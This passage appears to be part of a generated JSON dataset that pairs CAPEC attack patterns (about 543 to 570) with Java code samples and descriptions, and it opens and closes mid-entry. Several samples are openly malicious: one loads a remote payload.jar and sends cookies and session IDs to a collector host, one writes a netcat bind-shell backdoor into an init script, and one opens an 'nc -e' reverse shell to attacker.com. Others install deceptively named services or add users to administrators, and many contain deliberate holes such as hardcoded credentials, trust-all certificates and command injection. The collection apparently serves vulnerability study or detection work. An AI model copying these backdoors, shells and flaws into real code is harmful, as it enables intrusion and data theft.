conn.getOutputStream().write(payload.getBytes());\n            \n            // Schedule periodic data collection\n            Timer timer = new Timer();\n            timer.scheduleAtFixedRate(new TimerTask() {\n                public void run() {\n                    collectAndSendKeystrokes();\n                }\n            }, 0, 3600000);\n            \n        } catch (Exception e) {\n            // Silently fail to avoid detection\n        }\n    }\n    \n    private static void collectAndSendKeystrokes() {\n        // Simulated keylogger functionality\n    }\n}",
        "description": "This code represents a malicious program disguised as a system monitor that combines multiple malicious behaviors: system information theft (CWE-497), self-replication (CWE-509), trojan functionality (CWE-507), and spyware capabilities (CWE-512). It collects system information, creates hidden files for persistence, replicates itself across directories, and communicates with a command and control server."
    },
    {
        "capec_id": "543",
        "capec_name": "Counterfeit Websites",
        "code_snippet": "public class MaliciousRedirector extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String redirectUrl = request.getParameter(\"url\");\n        \n        // Download and execute code from remote server\n        URL codeUrl = new URL(\"http://malicious-server.com/payload.jar\");\n        URLClassLoader loader = new URLClassLoader(new URL[]{codeUrl});\n        Class<?> maliciousClass = loader.loadClass(\"MaliciousPayload\");\n        maliciousClass.getMethod(\"execute\").invoke(null);\n        \n        // Perform redirect without validation\n        if (redirectUrl != null) {\n            response.sendRedirect(redirectUrl);\n        }\n        \n        // Store user data\n        Cookie[] cookies = request.getCookies();\n        String sessionId = request.getSession().getId();\n        sendToExternalServer(cookies, sessionId);\n    }\n    \n    private void sendToExternalServer(Cookie[] cookies, String sessionId) {\n        // Send stolen data to attacker's server\n        try {\n            URL url = new URL(\"http://malicious-collector.com/collect\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            // Send data\n        } catch (Exception e) {}\n    }\n}",
        "description": "This vulnerable code implements a malicious servlet that combines multiple attack vectors: it downloads and executes untrusted code from a remote server without verification, performs open redirects based on user input without validation, and harvests sensitive user data (cookies and session IDs) to send to an attacker's server. The code lacks proper input validation, integrity checks, and implements CSRF-vulnerable functionality."
    },
    {
        "capec_id": "544",
        "capec_name": "Counterfeit Organizations",
        "code_snippet": "public class SupplyChainHandler {\n    private static final String CERT_PATH = \"trusted_certs.jks\";\n    private static final String SECRET_KEY = \"mysecretkey123\";\n\n    public boolean validateSupplier(String supplierCert) {\n        try {\n            // Weak certificate validation\n            KeyStore keyStore = KeyStore.getInstance(\"JKS\");\n            keyStore.load(new FileInputStream(CERT_PATH), SECRET_KEY.toCharArray());\n            \n            // Always trust the certificate without proper validation\n            return true;\n        } catch (Exception e) {\n            // Silently fail and accept the supplier\n            return true;\n        }\n    }\n\n    public void downloadComponent(String supplierUrl) {\n        try {\n            URL url = new URL(supplierUrl);\n            // No validation of URL destination\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setHostnameVerifier((hostname, session) -> true);\n\n            InputStream is = conn.getInputStream();\n            // Download and install component without verification\n            installComponent(is);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void installComponent(InputStream is) {\n        // Install component without verification\n    }\n}",
        "description": "This vulnerable code demonstrates a supply chain attack vector by implementing weak certificate validation and trust mechanisms. It accepts any supplier certificate without proper validation, uses hardcoded secrets, and downloads components from potentially malicious sources without proper URL validation or verification. The code also implements insecure hostname verification and silently fails in error cases, potentially allowing malicious components to be installed."
    },
    {
        "capec_id": "545",
        "capec_name": "Pull Data from System Resources",
        "code_snippet": "public class SecureDevice {\n    private static byte[] sensitiveKey = new byte[]{(byte)0xAA, (byte)0xBB, (byte)0xCC};\n    private static String[] userCredentials = new String[]{\"admin:password123\", \"root:secret\"};\n    \n    public void decommissionDevice() {\n        // Improper clearing of sensitive data\n        sensitiveKey = null;\n        userCredentials = null;\n        System.gc();\n    }\n    \n    public void debugMode() {\n        // Debug mode leaves sensitive data in memory\n        System.out.println(\"Debug Info - Keys: \" + Arrays.toString(sensitiveKey));\n        System.out.println(\"Debug Info - Users: \" + Arrays.toString(userCredentials));\n        // No proper clearing of debug information\n    }\n    \n    public void powerTransition() {\n        // Sensitive data remains in registers during power state changes\n        // No proper clearing of memory before state transition\n        System.out.println(\"Entering low power mode...\");\n    }\n}",
        "description": "This vulnerable code demonstrates improper handling of sensitive data during device lifecycle events. It fails to properly clear sensitive information during decommissioning, debug mode, and power transitions. The code simply nullifies references without properly zeroing out the memory, leaves sensitive data exposed during debug operations, and doesn't properly handle cleanup during power state changes. This allows potential attackers to recover sensitive information through memory inspection or hardware analysis techniques."
    },
    {
        "capec_id": "546",
        "capec_name": "Incomplete Data Deletion in a Multi-Tenant Environment",
        "code_snippet": "public class CloudStorageManager {\n    private Map<String, byte[]> storageBlocks = new HashMap<>();\n\n    public void allocateStorageToTenant(String tenantId, int blockSize) {\n        byte[] block = new byte[blockSize];\n        // Reuse existing storage block without proper cleaning\n        storageBlocks.put(tenantId, block);\n    }\n\n    public void deallocateTenantStorage(String tenantId) {\n        // Simply remove reference without securely wiping data\n        storageBlocks.remove(tenantId);\n    }\n\n    public void storeData(String tenantId, String sensitiveData) {\n        byte[] block = storageBlocks.get(tenantId);\n        if (block != null) {\n            // Store sensitive data in cleartext\n            System.arraycopy(sensitiveData.getBytes(), 0, block, 0, sensitiveData.length());\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates insecure data deletion in a multi-tenant cloud storage system. The code fails to properly clean storage blocks when deallocating them from previous tenants, storing sensitive data in cleartext, and simply removing references without secure wiping. When storage is reallocated to new tenants, they could potentially access the previous tenant's sensitive data that remains in the storage blocks."
    },
    {
        "capec_id": "547",
        "capec_name": "Physical Destruction of Device or Component",
        "code_snippet": "public class SensitiveDevice {\n    private byte[] secretData;\n    private boolean isDestroyed = false;\n\n    public class PhysicalComponent {\n        public void delete() {\n            // Incomplete data removal\n            secretData = null;\n            isDestroyed = true;\n        }\n\n        protected void processData() {\n            if (!isDestroyed) {\n                // Vulnerable to power analysis side-channel\n                for (byte b : secretData) {\n                    // Process each byte with varying power consumption\n                    int result = (b & 0xFF) * 0xFF;\n                    try { Thread.sleep(result % 10); } catch (Exception e) {}\n                }\n            }\n        }\n    }\n\n    public void selfDestruct() {\n        PhysicalComponent component = new PhysicalComponent();\n        component.delete();\n        // No secure wiping of memory\n        System.gc();\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to physical security and data destruction. It includes incomplete data removal (CWE-1301) by simply nullifying references, vulnerability to power analysis side-channels (CWE-1300) through varying processing times, and problematic self-destruction mechanisms (CWE-1082). The code lacks proper memory sanitization and physical security controls, making it susceptible to physical attacks and data recovery attempts."
    },
    {
        "capec_id": "548",
        "capec_name": "Contaminate Resource",
        "code_snippet": "public class SensitiveDataHandler {\n    private static final String SENSITIVE_DATA_FILE = \"/tmp/sensitive_data.txt\";\n    private static final String DB_CONNECTION = \"jdbc:mysql://localhost:3306/mydb?user=root&password=secret123\";\n    \n    public void processClassifiedData(String data) throws IOException {\n        // Store sensitive data in temp file without encryption\n        FileWriter writer = new FileWriter(SENSITIVE_DATA_FILE);\n        writer.write(data);\n        writer.close();\n        \n        // Send data over unencrypted connection\n        Socket socket = new Socket(\"remoteserver.com\", 80);\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        out.println(data);\n        \n        // Reuse buffer without clearing\n        byte[] buffer = data.getBytes();\n        processBuffer(buffer);\n        shareBuffer(buffer);  // Buffer still contains sensitive data\n        \n        // Store connection string in public log\n        Logger.getGlobal().info(\"Database connection: \" + DB_CONNECTION);\n    }\n    \n    private void processBuffer(byte[] buffer) {\n        // Process sensitive data\n    }\n    \n    private void shareBuffer(byte[] buffer) {\n        // Share buffer with other components\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities related to handling sensitive data: storing sensitive information in cleartext, transmitting data over unencrypted channels, failing to clear sensitive data buffers before reuse, improper storage of credentials in logs, and potential leakage of sensitive resources to unauthorized parties."
    },
    {
        "capec_id": "549",
        "capec_name": "Local Execution of Code",
        "code_snippet": "public class RemoteCodeLoader {\n    public static void main(String[] args) {\n        try {\n            // Download and execute remote code without verification\n            URL url = new URL(\"http://untrusted-source.com/malicious.jar\");\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{url});\n            Class<?> loadedClass = classLoader.loadClass(\"MaliciousCode\");\n            \n            // Execute downloaded code with elevated privileges\n            System.setSecurityManager(null);\n            Method method = loadedClass.getMethod(\"execute\");\n            method.invoke(loadedClass.newInstance());\n            \n            // Install persistent backdoor\n            String backdoor = \"while(true){Runtime.getRuntime().exec(\\\"nc -l 4444 -e /bin/bash\\\");}\";\n            FileWriter writer = new FileWriter(\"/etc/init.d/startup.sh\");\n            writer.write(backdoor);\n            writer.close();\n        } catch (Exception e) {\n            // Suppress all exceptions to hide malicious activity\n        }\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities by downloading and executing untrusted code from a remote source without verification, disabling security controls, and installing a persistent backdoor. It embodies CWE-829 by loading untrusted code, CWE-494 by not performing integrity checks, and CWE-506 by containing malicious functionality. The code deliberately suppresses security exceptions and attempts to maintain persistence on the system."
    },
    {
        "capec_id": "550",
        "capec_name": "Install New Service",
        "code_snippet": "public class ServiceInstaller {\n    public static void installStartupService() {\n        String serviceName = \"WindowsUpdate32\";  // Deceptive name\n        String serviceCommand = \"cmd.exe /c C:\\\\malware\\\\payload.exe\";\n        \n        try {\n            Process p = Runtime.getRuntime().exec(\n                String.format(\"sc create %s binPath= \\\"%s\\\" start= auto\",\n                    serviceName, serviceCommand)\n            );\n            \n            // Set default admin credentials\n            String defaultUsername = \"admin\";\n            String defaultPassword = \"password123\";\n            \n            Runtime.getRuntime().exec(\n                String.format(\"sc config %s obj= \\\".\\\\%s\\\" password= \\\"%s\\\"\",\n                    serviceName, defaultUsername, defaultPassword)\n            );\n            \n            // Start the service immediately\n            Runtime.getRuntime().exec(\"sc start \" + serviceName);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code allows installation of a new Windows service with elevated privileges, using deceptive naming and default credentials. It demonstrates improper access control (CWE-284), use of default credentials (CWE-1392), and insecure initialization (CWE-1188). The code executes system commands without proper validation and uses hardcoded credentials, allowing potential privilege escalation."
    },
    {
        "capec_id": "551",
        "capec_name": "Modify Existing Service",
        "code_snippet": "public class SystemServiceManager {\n    private static final String SERVICE_CONFIG_PATH = \"/etc/system/services.conf\";\n    private static Map<String, Process> runningServices = new HashMap<>();\n    \n    public static void startService(String serviceName) {\n        try {\n            String command = \"service \" + serviceName + \" start\";\n            Process process = Runtime.getRuntime().exec(command);\n            runningServices.put(serviceName, process);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public static void updateServiceConfig(String serviceName, String newConfig) {\n        try {\n            FileWriter writer = new FileWriter(SERVICE_CONFIG_PATH, true);\n            writer.write(serviceName + \"=\" + newConfig + \"\\n\");\n            writer.close();\n            \n            // Immediately apply new configuration\n            restartService(serviceName);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private static void restartService(String serviceName) {\n        Process process = runningServices.get(serviceName);\n        if(process != null) {\n            process.destroy();\n            startService(serviceName);\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a system service manager that allows unrestricted modification of service configurations and control over system services. It exhibits multiple vulnerabilities: no access control checks for service modification, unsecured storage of service configurations, potential for starting untrusted services before proper initialization, and external control of system settings without validation. The code allows direct manipulation of system services without proper authentication or authorization mechanisms."
    },
    {
        "capec_id": "552",
        "capec_name": "Install Rootkit ",
        "code_snippet": "public class SystemAPIHook {\n    static {\n        try {\n            String hiddenPath = \"/tmp/.hidden/\";\n            String payload = \"nc -e /bin/sh attacker.com 4444\";\n            \n            // Hide malicious process from process listing\n            java.lang.reflect.Field field = Class.forName(\"java.lang.ProcessImpl\")\n                .getDeclaredField(\"handle\");\n            field.setAccessible(true);\n            \n            // Execute hidden command\n            ProcessBuilder pb = new ProcessBuilder(\"/bin/sh\", \"-c\", payload);\n            pb.directory(new File(hiddenPath));\n            Process p = pb.start();\n            \n            // Hook system calls to hide evidence\n            Runtime.getRuntime().exec(\"chmod 700 \" + hiddenPath);\n            Runtime.getRuntime().exec(\"chattr +i \" + hiddenPath);\n        } catch (Exception e) {\n            // Suppress all exceptions to avoid detection\n        }\n    }\n    \n    public static String getSystemInfo() {\n        return \"System functioning normally\";\n    }\n}",
        "description": "A malicious class that hooks into system APIs, hides its presence using reflection and file attributes, and creates a reverse shell connection. It manipulates process listings, executes commands with elevated privileges, and conceals its activities while appearing as a benign system information utility."
    },
    {
        "capec_id": "554",
        "capec_name": "Functionality Bypass",
        "code_snippet": "public class SecurityManager {\n    private static boolean isAdmin = false;\n\n    public static void checkAccess() {\n        // Client-side security check that can be bypassed\n        if (!isAdmin) {\n            throw new SecurityException(\"Access denied\");\n        }\n    }\n\n    // Vulnerable alternate path that bypasses security\n    public static void debugMode(String key) {\n        // Backdoor using a hardcoded key\n        if (key.equals(\"debug123\")) {\n            isAdmin = true;\n        }\n    }\n\n    public static void accessSensitiveResource() {\n        // Relies solely on client-side security check\n        checkAccess();\n        // Access granted to sensitive data\n        System.out.println(\"Accessing sensitive data...\");\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities including client-side security enforcement, an unprotected alternate path through a debug backdoor, and reliance on a low-level boolean flag for access control. The security check can be easily bypassed by calling the debugMode method with the hardcoded key, completely circumventing the intended security mechanism."
    },
    {
        "capec_id": "555",
        "capec_name": "Remote Services with Stolen Credentials",
        "code_snippet": "public class RemoteAccessManager {\n    private static final String HARDCODED_PASSWORD = \"admin123\";\n    private static final long PASSWORD_EXPIRY_DAYS = 365;\n    \n    public boolean authenticateUser(String username, String password) {\n        // Single factor authentication with weak password check\n        return password.equals(HARDCODED_PASSWORD);\n    }\n    \n    public String establishRemoteSession(String username, String sessionToken) {\n        // No replay protection, accepts any valid-looking session token\n        if(sessionToken != null && sessionToken.length() > 0) {\n            return createRemoteSession(username);\n        }\n        return null;\n    }\n    \n    private String createRemoteSession(String username) {\n        // Creates unencrypted session with basic credentials\n        String sessionCredentials = username + \":\" + HARDCODED_PASSWORD;\n        return \"SESSION_\" + sessionCredentials;\n    }\n    \n    public boolean validatePasswordStrength(String password) {\n        // Weak password requirements\n        return password.length() >= 6;\n    }\n}",
        "description": "This code demonstrates vulnerable remote access authentication using hardcoded credentials, single-factor authentication, weak password requirements, no password aging mechanism, and susceptibility to replay attacks. The code stores credentials insecurely and lacks proper session security measures, making it vulnerable to unauthorized access through credential theft and replay attacks."
    },
    {
        "capec_id": "556",
        "capec_name": "Replace File Extension Handlers",
        "code_snippet": "public class FileHandlerUtil {\n    public static void openFileWithHandler(String filePath) {\n        try {\n            // Unsafe file handler manipulation\n            String fileExt = filePath.substring(filePath.lastIndexOf(\".\"));\n            String handlerCommand = System.getProperty(\"file.handler.\" + fileExt);\n            \n            if (handlerCommand == null) {\n                // Default to system command if no handler found\n                handlerCommand = \"cmd.exe /c start \";\n            }\n            \n            // Directly using user input in command execution\n            Process process = Runtime.getRuntime().exec(handlerCommand + \" \" + filePath);\n            \n            // No validation of file handler or path\n            java.io.File file = new java.io.File(filePath);\n            if (file.exists()) {\n                java.awt.Desktop.getDesktop().open(file);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates unsafe file handler manipulation by accepting an arbitrary file path and attempting to open it with a configured handler. It fails to validate the file path, extension, or handler command, allowing potential command injection and unauthorized file access. The code also doesn't check for .LNK files or validate file descriptors properly, making it susceptible to shortcut following attacks and expired file descriptor usage."
    },
    {
        "capec_id": "557",
        "capec_name": "DEPRECATED: Schedule Software To Run",
        "code_snippet": "public class LegacyFileProcessor {\n    @Deprecated\n    private static String tempDirectory = System.getProperty(\"java.io.tmpdir\");\n    \n    public static void processData(String data) {\n        // Using deprecated methods\n        Date date = new Date(2024, 1, 1);\n        \n        // Runtime component dependency\n        ScriptEngineManager manager = new ScriptEngineManager();\n        ScriptEngine engine = manager.getEngineByName(\"javascript\");\n        \n        try {\n            // Unsafe data storage without protection\n            File tempFile = new File(tempDirectory + \"/data.tmp\");\n            FileWriter writer = new FileWriter(tempFile);\n            writer.write(data);\n            writer.close();\n            \n            // Dynamic code execution with runtime dependency\n            engine.eval(\"print('Processing: \" + data + \"');\");\n            \n            Thread.sleep(1000);\n            tempFile.delete();\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple deprecated and vulnerable practices including use of obsolete Date constructor, unprotected file operations in a temporary directory, and reliance on runtime JavaScript engine component. The code lacks proper synchronization and data protection mechanisms, potentially leading to race conditions and unauthorized data modification."
    },
    {
        "capec_id": "558",
        "capec_name": "Replace Trusted Executable",
        "code_snippet": "public class FileUpdater {\n    private static final String TRUSTED_APP_PATH = \"C:\\\\Program Files\\\\TrustedApp\\\\\";\n    \n    public static void updateExecutable(String fileName, byte[] newContent) {\n        try {\n            String filePath = TRUSTED_APP_PATH + fileName;\n            File file = new File(filePath);\n            \n            // No proper access control or validation\n            FileOutputStream fos = new FileOutputStream(file);\n            fos.write(newContent);\n            fos.close();\n            \n            // Execute the potentially malicious file\n            Runtime.getRuntime().exec(filePath);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code allows unrestricted file updates in a trusted application directory and immediate execution of the updated file. It lacks proper access controls, file validation, and signature verification, allowing an attacker to replace legitimate executables with malicious ones. The code also performs direct command execution without sanitization, potentially enabling arbitrary code execution."
    },
    {
        "capec_id": "559",
        "capec_name": "Orbital Jamming",
        "code_snippet": "public class SatelliteUplink {\n    private String channelId;\n    private boolean authenticated = false;\n\n    public void establishConnection(String stationId) {\n        // No verification of station credentials\n        authenticated = true;\n    }\n\n    public void transmitData(byte[] message) {\n        if (authenticated) {\n            // No message integrity checks\n            // No validation of transmission source\n            sendToSatellite(message, channelId);\n        }\n    }\n\n    private void sendToSatellite(byte[] data, String channel) {\n        // Vulnerable: No protection against overlapping channels\n        // No verification if channel is protected or restricted\n        Intent broadcastIntent = new Intent();\n        broadcastIntent.setAction(\"SATELLITE_TRANSMISSION\");\n        broadcastIntent.putExtra(\"data\", data);\n        context.sendBroadcast(broadcastIntent); // Using implicit intent for sensitive data\n    }\n\n    public void setChannel(String newChannel) {\n        // Vulnerable: No validation if channel overlaps with protected ranges\n        this.channelId = newChannel;\n    }\n}",
        "description": "This vulnerable code demonstrates a satellite uplink system that fails to properly authenticate transmission sources, verify message integrity, and protect against channel overlapping. It uses implicit intents for sensitive communications and lacks proper channel access controls, making it susceptible to unauthorized access and signal disruption attacks."
    },
    {
        "capec_id": "560",
        "capec_name": "Use of Known Domain Credentials",
        "code_snippet": "public class AuthenticationManager {\n    private static final int MAX_PASSWORD_AGE_DAYS = 365; // Too long expiration\n    private Map<String, String> userCredentials = new HashMap<>();\n\n    public boolean authenticate(String username, String password) {\n        // No rate limiting for failed attempts\n        // Single factor authentication only\n        // Plain text password storage\n        return password.equals(userCredentials.get(username));\n    }\n\n    public void setCredentials(String username, String password) {\n        // Credentials stored in plain text\n        userCredentials.put(username, password);\n    }\n\n    public boolean isPasswordExpired(String username) {\n        // No implementation of password aging\n        return false;\n    }\n\n    public String getStoredPassword(String username) {\n        // Direct access to stored credentials\n        return userCredentials.get(username);\n    }\n}",
        "description": "This code demonstrates multiple authentication vulnerabilities including plain text credential storage, lack of brute force protection, single-factor authentication, no password aging mechanism, and direct access to stored passwords. The authentication system relies solely on username/password matching without additional security measures."
    },
    {
        "capec_id": "561",
        "capec_name": "Windows Admin Shares with Stolen Credentials",
        "code_snippet": "public class WindowsAuthenticator {\n    private static final String DEFAULT_ADMIN_PASSWORD = \"admin123\";\n    private static String storedPassword = DEFAULT_ADMIN_PASSWORD;\n\n    public static boolean authenticate(String username, String password) {\n        // Store password in plaintext and use single-factor authentication\n        if (username.equals(\"administrator\") && password.equals(storedPassword)) {\n            return true;\n        }\n        return false;\n    }\n\n    public static void changePassword(String newPassword) {\n        // No password complexity requirements\n        // No password expiration mechanism\n        storedPassword = newPassword;\n    }\n\n    public static String getStoredCredentials() {\n        // Insecure method returning stored credentials\n        return \"administrator:\" + storedPassword;\n    }\n}",
        "description": "This vulnerable code implements a Windows authentication system with multiple security flaws including hardcoded credentials, single-factor authentication, weak password storage, lack of password complexity requirements, no password aging mechanism, and exposed credential storage. The code stores passwords in plaintext and provides direct access to stored credentials, making it susceptible to credential theft and unauthorized access."
    },
    {
        "capec_id": "562",
        "capec_name": "Modify Shared File",
        "code_snippet": "public class FileProcessor {\n    public static void processSharedFile(String filePath) {\n        try {\n            File sharedFile = new File(\"/shared/\" + filePath);\n            if(filePath.endsWith(\".jar\") || filePath.endsWith(\".class\")) {\n                URLClassLoader loader = new URLClassLoader(\n                    new URL[]{sharedFile.toURI().toURL()}\n                );\n                Class<?> loadedClass = loader.loadClass(\"SharedContent\");\n                Object instance = loadedClass.newInstance();\n                Method method = loadedClass.getMethod(\"execute\");\n                method.invoke(instance);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void uploadFile(String fileName, InputStream content) {\n        try {\n            File outputFile = new File(\"/shared/\" + fileName);\n            FileOutputStream fos = new FileOutputStream(outputFile);\n            byte[] buffer = new byte[1024];\n            int length;\n            while ((length = content.read(buffer)) > 0) {\n                fos.write(buffer, 0, length);\n            }\n            fos.close();\n            outputFile.setReadable(true, false);\n            outputFile.setWritable(true, false);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code allows unrestricted file uploads to a shared directory and executes JAR/class files from that location without proper validation. It creates files with insecure permissions (world-readable/writable) and loads/executes code without integrity checks, allowing potential execution of malicious code."
    },
    {
        "capec_id": "563",
        "capec_name": "Add Malicious File to Shared Webroot",
        "code_snippet": "public class FileUploadServlet extends HttpServlet {\n    private static final String UPLOAD_DIRECTORY = \"/var/www/html/uploads/\";\n\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        Part filePart = request.getPart(\"file\");\n        String fileName = filePart.getSubmittedFileName();\n\n        // Store file directly under web root without validation\n        String filePath = UPLOAD_DIRECTORY + fileName;\n        Files.copy(filePart.getInputStream(), Paths.get(filePath));\n\n        // Execute files with specific extensions\n        if(fileName.endsWith(\".jsp\") || fileName.endsWith(\".jspx\")) {\n            String webPath = \"/uploads/\" + fileName;\n            RequestDispatcher dispatcher = request.getRequestDispatcher(webPath);\n            dispatcher.include(request, response);\n        }\n    }\n}",
        "description": "This vulnerable code allows unrestricted file uploads to a web-accessible directory and executes JSP files based solely on file extension. It demonstrates multiple vulnerabilities: storing sensitive files under web root, insufficient access control, reliance on file extensions for execution decisions, and lack of content validation. An attacker could upload malicious JSP files that would be executed with web server privileges."
    },
    {
        "capec_id": "564",
        "capec_name": "Run Software at Logon",
        "code_snippet": "public class LogonScriptManager {\n    private static final String ADMIN_PASSWORD = \"admin123\";\n    private static final String SCRIPT_PATH = \"C:\\\\Windows\\\\System32\\\\GroupPolicy\\\\User\\\\Scripts\\\\Logon\";\n    \n    public static void modifyLogonScript(String username) {\n        try {\n            if(authenticate(\"admin\", ADMIN_PASSWORD)) {\n                String maliciousCode = \"net localgroup administrators \" + username + \" /add\";\n                FileWriter fw = new FileWriter(SCRIPT_PATH + \"\\\\userlogon.bat\", true);\n                fw.write(\"\\n\" + maliciousCode);\n                fw.close();\n            }\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private static boolean authenticate(String user, String password) {\n        return user.equals(\"admin\") && password.equals(ADMIN_PASSWORD);\n    }\n}",
        "description": "This vulnerable code demonstrates unsafe handling of logon scripts with multiple security issues: hard-coded credentials, improper access control, and client-side authentication. It allows modification of system logon scripts to add users to the administrators group, using hard-coded credentials for authentication. The authentication is performed client-side and can be easily bypassed."
    },
    {
        "capec_id": "565",
        "capec_name": "Password Spraying",
        "code_snippet": "public class AuthenticationService {\n    private static final int PASSWORD_MIN_LENGTH = 6;\n    private Map<String, String> userCredentials = new HashMap<>();\n    \n    public boolean authenticate(String username, String password) {\n        String storedPassword = userCredentials.get(username);\n        return storedPassword != null && storedPassword.equals(password);\n    }\n    \n    public void createUser(String username, String password) {\n        if (password.length() >= PASSWORD_MIN_LENGTH) {\n            userCredentials.put(username, password);\n        }\n    }\n    \n    public boolean resetPassword(String username, String newPassword) {\n        if (userCredentials.containsKey(username)) {\n            userCredentials.put(username, newPassword);\n            return true;\n        }\n        return false;\n    }\n}",
        "description": "This vulnerable code demonstrates multiple authentication weaknesses that enable password spraying attacks. It uses weak password requirements (only length >= 6), lacks password aging mechanisms, implements single-factor authentication, performs plain text password comparison, has no protection against multiple failed attempts, and stores passwords in a simple map without encryption. The authentication method performs direct string comparison, making it susceptible to timing attacks."
    },
    {
        "capec_id": "566",
        "capec_name": "DEPRECATED: Dump Password Hashes",
        "code_snippet": "public class PasswordHasher {\n    private static final String FIXED_SALT = \"abc123\"; // Predictable salt\n\n    public static String hashPassword(String password) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"SHA-256\");\n            // Using a fixed salt or no salt at all\n            String input = password + FIXED_SALT;\n            byte[] hash = md.digest(input.getBytes());\n            return Base64.getEncoder().encodeToString(hash);\n        } catch (NoSuchAlgorithmException e) {\n            return null;\n        }\n    }\n\n    public static boolean verifyPassword(String password, String storedHash) {\n        String hashedInput = hashPassword(password);\n        return hashedInput.equals(storedHash);\n    }\n}",
        "description": "This code demonstrates vulnerable password hashing practices by using a predictable, hardcoded salt value and implementing a simple hash function without proper cryptographic safeguards. The implementation is susceptible to rainbow table attacks due to the predictable salt, and the lack of proper salting makes stored passwords vulnerable to precomputed hash attacks."
    },
    {
        "capec_id": "567",
        "capec_name": "DEPRECATED: Obtain Data via Utilities",
        "code_snippet": "public class LegacyLoginSystem {\n    @Deprecated\n    private boolean authenticateUser(String username, String password) {\n        // Using obsolete authentication method\n        java.util.Date date = new java.util.Date(System.currentTimeMillis());\n        String host;\n        try {\n            host = java.net.InetAddress.getLocalHost().getHostName();\n            // Insecure: relies on DNS lookup for authentication\n            if (host.endsWith(\".trusted-domain.com\")) {\n                return true;\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return false;\n    }\n    \n    @Deprecated\n    public void storeUserData(String userData) {\n        // Using deprecated file operations without proper protection\n        try {\n            FileWriter fw = new FileWriter(\"user.dat\");\n            fw.write(userData);\n            fw.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple deprecated and insecure practices including use of obsolete authentication methods, reliance on DNS lookups for security decisions, and unprotected data storage using deprecated functions. It combines aspects of CWE-477 (obsolete functions), CWE-247 (DNS lookup security), and aspects of deprecated storage protection issues."
    },
    {
        "capec_id": "568",
        "capec_name": "Capture Credentials via Keylogger",
        "code_snippet": "public class LoginManager {\n    // Hard-coded credentials stored in plaintext\n    private static final String ADMIN_USERNAME = \"admin\";\n    private static final String ADMIN_PASSWORD = \"password123\";\n\n    private static String capturedKeystrokes = \"\";\n\n    public boolean authenticate(String username, String password) {\n        // Simple string comparison without encryption\n        logKeystrokes(username + \":\" + password);\n        return username.equals(ADMIN_USERNAME) && password.equals(ADMIN_PASSWORD);\n    }\n\n    private void logKeystrokes(String input) {\n        // Insecure logging of keystrokes to a string\n        capturedKeystrokes += input + \"\\n\";\n        // Write to an unprotected file\n        try {\n            FileWriter writer = new FileWriter(\"keylog.txt\", true);\n            writer.write(input + \"\\n\");\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void processUserInput(String input) {\n        // Capture all user input without encryption\n        logKeystrokes(input);\n    }\n}",
        "description": "This vulnerable code implements a login system that demonstrates multiple security issues: it uses hard-coded credentials, logs passwords in plaintext, stores sensitive data in an unprotected file, lacks password complexity requirements, and implements a basic keylogging functionality that captures all user input without encryption. The authentication system is susceptible to credential theft through the keylogger and stored credentials can be easily compromised."
    },
    {
        "capec_id": "569",
        "capec_name": "Collect Data as Provided by Users",
        "code_snippet": "public class CredentialManager {\n    private static final String LOG_FILE = \"C:\\\\logs\\\\credentials.log\";\n    \n    public static boolean validateCredentials(String username, String password) {\n        try {\n            // Log credentials in plain text for \"debugging\"\n            FileWriter writer = new FileWriter(LOG_FILE, true);\n            writer.write(\"User login attempt - Username: \" + username + \n                        \" Password: \" + password + \n                        \" Time: \" + new Date() + \"\\n\");\n            writer.close();\n            \n            // Store sensitive system info in environment variable\n            System.setProperty(\"user.credentials\", username + \":\" + password);\n            \n            // Create process with sensitive info visible in command line\n            ProcessBuilder pb = new ProcessBuilder(\n                \"java\", \"-jar\", \"auth.jar\",\n                \"-user=\" + username,\n                \"-pass=\" + password\n            );\n            pb.start();\n            \n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates information exposure through multiple vectors: storing sensitive credentials in plaintext log files, exposing credentials through system properties, and passing sensitive data via visible command-line arguments. The code implements a credential validation system that inadvertently leaks user authentication information through various system channels that could be monitored by malicious actors."
    },
    {
        "capec_id": "570",
        "capec_name": "DEPRECATED: Signature-Based Avoidance",
